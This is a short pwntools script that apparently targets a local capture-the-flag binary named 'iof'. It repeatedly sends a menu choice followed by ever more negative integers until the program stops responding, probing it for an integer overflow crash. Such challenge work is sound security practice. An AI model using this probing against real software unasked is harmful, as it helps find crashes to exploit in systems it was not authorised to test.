#!/usr/bin/python3

from pwn import *

exe = ELF('./iof')

p = process(exe.path)
i = -1
while 1:
    p.sendline(b'1')
    p.sendline(str(i))
    try:
        p.recvuntil('Choice')
        i = i -1
    except:
        break
